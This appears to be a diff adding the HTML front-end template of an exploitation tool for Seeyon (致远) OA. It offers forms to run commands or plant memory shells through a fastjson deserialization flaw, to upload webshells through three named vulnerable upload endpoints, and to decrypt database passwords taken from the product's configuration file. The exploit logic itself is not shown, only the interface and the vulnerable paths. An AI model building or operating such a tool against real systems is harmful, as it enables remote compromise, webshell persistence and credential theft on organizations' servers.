@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en" xmlns="http://www.w3.org/1999/html">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <link rel="stylesheet" href="/static/css/bootstrap.min.css"/>
+  <link rel="stylesheet" href="/static/css/css.css"/>
+  <script src="/static/js/seeyon/seeyon.js"></script>
+  <script src="/static/js/jquery-min.js"></script>
+  <script src="/static/js/jquery.serializejson.js"></script>
+  <title>致远OA</title>
+</head>
+<body class="body">
+<nav class="navbar navbar-default navbar-static-top">
+  <div class="container">
+    <script src="/static/js/head.js"></script>
+    <div>
+      <span style="color: red" th:text="${proxyset}" th:if="${not #strings.isEmpty(proxyset) }"></span>
+    </div>
+  </div>
+</nav>
+
+<div class="container" style="background-color: #FFFFFF;">
+  <center>
+    <h3>致远A6-fastjson反序列化漏洞</h3>
+    <p id="BugUrl" class="help-block">漏洞路径：/seeyon/main.do?method=changeLocale</p>
+  </center>
+  <form class="form-horizontal" th:action="@{/seeyon/A6V5FastJson}" method="post"
+        enctype="multipart/form-data">
+
+    <div class="form-group">
+      <label class="col-md-2 control-label">URL</label>
+      <div class="col-md-10">
+        <input class="form-control" type="text" name="url" placeholder="目标url,存在多出fastjson反序列化漏洞,可选择其中一个利用"
+               th:value="${A6V5FastJsonurl}">
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label class="col-md-2 control-label">漏洞路径</label>
+      <div class="col-md-10">
+        <select id="uType" name="uType" onchange="changeUrl()">
+          <option>changeLocale</option>
+          <option>sursenServlet</option>
+          <option>portalManager</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label class="col-md-2 control-label">攻击类型</label>
+      <div class="col-md-10">
+        <select id="select" name="mOption" onchange="appendform()">
+          <option>Execute</option>
+          <option>MemoryShell</option>
+          <option>UploadShell</option>
+        </select>
+      </div>
+    </div>
+
+    <div id="appendform">
+      <div class="form-group">
+        <label class="col-md-2 control-label">执行命令</label>
+        <div class="col-md-10">
+          <input class="form-control" type="text" name="cmd" placeholder="calc.exe">
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label class="col-md-2 control-label">中间件类型</label>
+        <div class="col-md-10">
+          <select name="mType">
+            <option selected="selected">Tomcat</option>
+            <option>Resin</option>
+            <option>Jetty</option>
+          </select>
+        </div>
+      </div>
+    </div>
+
+    <div class="col-md-10 col-md-offset-2" style="padding-bottom: 20px;">
+      <input type="submit" class="btn btn-default btn-lg" name="submit" value="提交">
+    </div>
+  </form>
+  <form class="form-horizontal">
+    <div class="form-group">
+      <label class="col-md-2 control-label">响应结果</label>
+      <div class="col-md-10">
+                <textarea class="form-control" rows="5" th:text="${A6V5FastJson}"
+                          th:if="${not #strings.isEmpty(A6V5FastJson) }"></textarea>
+        <p class="help-block" style="color: red" th:text="${A6V5FastJsontips}"
+           th:if="${not #strings.isEmpty(A6V5FastJsontips) }"></p>
+      </div>
+    </div>
+  </form>
+</div>
+
+<hr>
+
+<div class="container" style="background-color: #FFFFFF;">
+  <center>
+    <h3>致远A6-fileUpload.do后台文件上传</h3>
+    <p id="fileuploadUrl" class="help-block">漏洞路径：/seeyon/fileUpload.do?method=processUpload，使用：/privilege/menu.do?method=uploadMenuIcon文件移动，适用A6V5V6,A8V5</p>
+  </center>
+  <form class="form-horizontal" th:action="@{/seeyon/A6FileUploadPoc}" method="post"
+        enctype="multipart/form-data">
+
+    <div class="form-group">
+      <label class="col-md-2 control-label">URL</label>
+      <div class="col-md-10">
+        <input class="form-control" type="text" name="url" placeholder="目标url，存在多种利用链，可选择其中一个利用"
+               th:value="${A6FileUploadPocurl}">
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label class="col-md-2 control-label">利用链</label>
+      <div class="col-md-10">
+        <select id="pType" name="pType" onchange="changepType()">
+          <option>UploadMenuIcon</option>
+          <option>PortalDesignerManager</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="form-group sr-only">
+      <label class="col-md-2 control-label">版本</label>
+      <div class="col-md-10">
+        <input type="text" class="form-control" value="A6" name="version"/>
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label class="col-md-2 control-label">WEBSHELL</label>
+      <div class="col-md-10">
+        <input type="file" name="files" placeholder="你要写入的webshell">
+      </div>
+    </div>
+
+    <div class="col-md-10 col-md-offset-2" style="padding-bottom: 20px;">
+      <input type="submit" class="btn btn-default btn-lg" name="submit" value="提交">
+    </div>
+  </form>
+  <form class="form-horizontal">
+    <div class="form-group">
+      <label class="col-md-2 control-label">响应结果</label>
+      <div class="col-md-10">
+                <textarea class="form-control" rows="5" th:text="${A6FileUploadPoc}"
+                          th:if="${not #strings.isEmpty(A6FileUploadPoc) }"></textarea>
+        <p class="help-block" style="color: red" th:text="${A6FileUploadPoctips}"
+           th:if="${not #strings.isEmpty(A6FileUploadPoctips) }"></p>
+      </div>
+    </div>
+  </form>
+</div>
+
+
+<hr>
+<div class="container" style="background-color: #FFFFFF;">
+  <center>
+    <h3>致远OA-htmlofficeservlet前台文件上传</h3>
+    <p class="help-block">漏洞路径：/seeyon/htmlofficeservlet，适用A6-V5V6,A8-V7.0</p>
+  </center>
+  <form class="form-horizontal" th:action="@{/seeyon/htmlofficeservlet}" method="post"
+        enctype="multipart/form-data">
+
+    <div class="form-group">
+      <label class="col-md-2 control-label">URL</label>
+      <div class="col-md-10">
+        <input class="form-control" type="text" name="url" placeholder="目标url"
+               th:value="${htmlofficeservleturl}">
+      </div>
+    </div>
+
+    <div class="form-group sr-only">
+      <label class="col-md-2 control-label">脏数据</label>
+      <div class="col-md-10">
+        <input type="text" class="form-control" value="50" name="count"/>
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label class="col-md-2 control-label">WEBSHELL</label>
+      <div class="col-md-10">
+        <input type="file" name="files" placeholder="你要写入的webshell">
+      </div>
+    </div>
+
+    <div class="col-md-10 col-md-offset-2" style="padding-bottom: 20px;">
+      <input type="submit" class="btn btn-default btn-lg" name="submit" value="提交">
+    </div>
+  </form>
+  <form class="form-horizontal">
+    <div class="form-group">
+      <label class="col-md-2 control-label">响应结果</label>
+      <div class="col-md-10">
+                <textarea class="form-control" rows="5" th:text="${htmlofficeservlet}"
+                          th:if="${not #strings.isEmpty(htmlofficeservlet) }"></textarea>
+        <p class="help-block" style="color: red" th:text="${htmlofficeservlettips}"
+           th:if="${not #strings.isEmpty(htmlofficeservlettips) }"></p>
+      </div>
+    </div>
+  </form>
+</div>
+
+
+<hr>
+<div class="container" style="background-color: #FFFFFF;">
+  <center>
+    <h3>致远OA-WPSAssistServletUpload文件上传</h3>
+    <p class="help-block">漏洞路径：/seeyon/wpsAssistServlet，适用A6/A8/A8N_V8.0SP2&LTS</p>
+  </center>
+  <form class="form-horizontal" th:action="@{/seeyon/WPSAssistServletUpload}" method="post"
+        enctype="multipart/form-data">
+
+    <div class="form-group">
+      <label class="col-md-2 control-label">URL</label>
+      <div class="col-md-10">
+        <input class="form-control" type="text" name="url" placeholder="目标url"
+               th:value="${WPSAssistServletUploadurl}">
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label class="col-md-2 control-label">WEBSHELL</label>
+      <div class="col-md-10">
+        <input type="file" name="files" placeholder="你要写入的webshell">
+      </div>
+    </div>
+
+    <div class="col-md-10 col-md-offset-2" style="padding-bottom: 20px;">
+      <input type="submit" class="btn btn-default btn-lg" name="submit" value="提交">
+    </div>
+  </form>
+  <form class="form-horizontal">
+    <div class="form-group">
+      <label class="col-md-2 control-label">响应结果</label>
+      <div class="col-md-10">
+                <textarea class="form-control" rows="5" th:text="${WPSAssistServletUpload}"
+                          th:if="${not #strings.isEmpty(WPSAssistServletUpload) }"></textarea>
+        <p class="help-block" style="color: red" th:text="${WPSAssistServletUploadtips}"
+           th:if="${not #strings.isEmpty(WPSAssistServletUploadtips) }"></p>
+      </div>
+    </div>
+  </form>
+</div>
+
+
+
+<hr>
+<div class="container" style="background-color: #FFFFFF;">
+  <center>
+    <h3>致远OA-数据库解密</h3>
+    <p class="help-block">配置文件路径：/base/conf/datasourceCtp.properties</p>
+  </center>
+  <form class="form-horizontal" th:action="@{/seeyon/DBPassDecode}" method="post"
+        enctype="application/x-www-form-urlencoded">
+
+    <div class="form-group">
+      <label class="col-md-2 control-label">数据库密码</label>
+      <div class="col-md-10">
+        <input class="form-control" type="text" name="password" placeholder="/2.4/GtwWXfgvyXO4KqR/8OIP4pJKPWSITMHBAWXOz0eKjBo= 或者  /1.0/UWJ0dHgxc2U="
+               th:value="${DBPassDecodepassword}">
+      </div>
+    </div>
+
+    <div class="col-md-10 col-md-offset-2" style="padding-bottom: 20px;">
+      <input type="submit" class="btn btn-default btn-lg" name="submit" value="提交">
+    </div>
+  </form>
+  <form class="form-horizontal">
+    <div class="form-group">
+      <label class="col-md-2 control-label">响应结果</label>
+      <div class="col-md-10">
+                <textarea class="form-control" rows="5" th:text="${DBPassDecode}"
+                          th:if="${not #strings.isEmpty(DBPassDecode) }"></textarea>
+      </div>
+    </div>
+  </form>
+</div>
+
+
+</body>
+</html>
